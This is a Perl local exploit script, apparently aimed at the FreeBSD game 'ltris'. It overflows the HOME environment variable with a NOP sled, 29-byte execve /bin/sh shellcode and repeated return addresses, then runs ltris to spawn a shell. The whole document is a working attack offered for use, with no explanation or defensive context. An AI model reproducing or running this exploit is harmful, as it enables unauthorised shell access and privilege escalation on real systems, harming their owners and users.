#!/usr/bin/perl
$len = 520;
$ret = 0xbfbff825;
$nop = "\x90";
$offset = 0;
$shellcode =    "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56". #freebsd 29 bytes
                "\xb0\x3b\x50\xcd\x80\xe8\xed\xff\xff\xff\x2f". #execve /bin/sh
                "\x62\x69\x6e\x2f\x73\x68\x23";                 #zillionATsafemode.org

if (@ARGV == 1) {
    $offset = $ARGV[0];
}
for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
$new_ret = pack('l', ($ret + $offset));

for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}
local($ENV{'HOME'}) = $buffer; 
exec("ltris 2>/dev/null");